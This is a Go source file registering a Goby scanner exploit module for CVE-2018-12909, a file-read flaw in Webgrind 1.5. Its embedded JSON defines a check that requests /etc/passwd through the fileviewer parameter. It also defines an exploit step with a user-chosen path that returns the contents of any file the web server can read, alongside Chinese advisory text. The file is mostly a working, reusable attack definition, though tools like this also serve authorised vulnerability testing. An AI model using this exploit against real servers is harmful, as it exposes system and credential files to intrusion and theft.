package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "Webgrind_File_read_cve-2018-12909",
  "Description": "<p>Webgrind是一套PHP执行时间分析工具。</p><p>Webgrind 1.5版本中存在安全漏洞，该漏洞源于程序依靠用户输入来显示文件。攻击者可借助index.php?op=fileviewer＆file= URI利用该漏洞查看可被Webserver用户访问的本地文件系统上的文件。</p>",
  "Product": "",
  "Homepage": "https://github.com/jokkedk/webgrind",
  "DisclosureDate": "2022-06-24",
  "Author": "",
  "FofaQuery": "app=\"Webgrind\"",
  "GobyQuery": "app=\"Webgrind\"",
  "Level": "2",
  "Impact": "<p>Webgrind是一套PHP执行时间分析工具。</p><p>Webgrind 1.5版本中存在安全漏洞，该漏洞源于程序依靠用户输入来显示文件。攻击者可借助index.php?op=fileviewer＆file= URI利用该漏洞查看可被Webserver用户访问的本地文件系统上的文件。</p>",
  "Recommendation": "<p>目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：</p><p><a target=\"_Blank\" href=\"https://github.com/jokkedk/webgrind\">https://github.com/jokkedk/webgrind</a></p>",
  "References": [
    "https://github.com/jokkedk/webgrind/issues/112"
  ],
  "Is0day": false,
  "HasExp": true,
  "ExpParams": [
    {
      "name": "path",
      "type": "input",
      "value": "/etc/passwd",
      "show": ""
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/index.php?op=fileviewer&file=/etc/passwd",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "regex",
            "value": "root:[x*]?:0:0:",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/index.php?op=fileviewer&file={{{path}}}",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "regex",
            "value": "root:[x*]?:0:0:",
            "bz": ""
          }
        ]
      },
      "SetVariable": [
        "output|lastbody||"
      ]
    }
  ],
  "Tags": [
    "任意⽂件下载"
  ],
  "VulType": [
    "任意⽂件下载"
  ],
  "CVEIDs": [
    " CVE-2018-12909"
  ],
  "CNNVD": [
    "CNNVD-201806-1367"
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "Webgrind_File_read_cve-2018-12909",
      "Product": "",
      "Description": "<p>Webgrind是一套PHP执行时间分析工具。</p><p>Webgrind 1.5版本中存在安全漏洞，该漏洞源于程序依靠用户输入来显示文件。攻击者可借助index.php?op=fileviewer＆file= URI利用该漏洞查看可被Webserver用户访问的本地文件系统上的文件。</p>",
      "Recommendation": "<p>目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：</p><p><a target=\"_Blank\" href=\"https://github.com/jokkedk/webgrind\">https://github.com/jokkedk/webgrind</a></p>",
      "Impact": "<p>Webgrind是一套PHP执行时间分析工具。</p><p>Webgrind 1.5版本中存在安全漏洞，该漏洞源于程序依靠用户输入来显示文件。攻击者可借助index.php?op=fileviewer＆file= URI利用该漏洞查看可被Webserver用户访问的本地文件系统上的文件。</p>",
      "VulType": [
        "任意⽂件下载"
      ],
      "Tags": [
        "任意⽂件下载"
      ]
    },
    "EN": {
      "Name": "Webgrind_File_read_cve-2018-12909",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}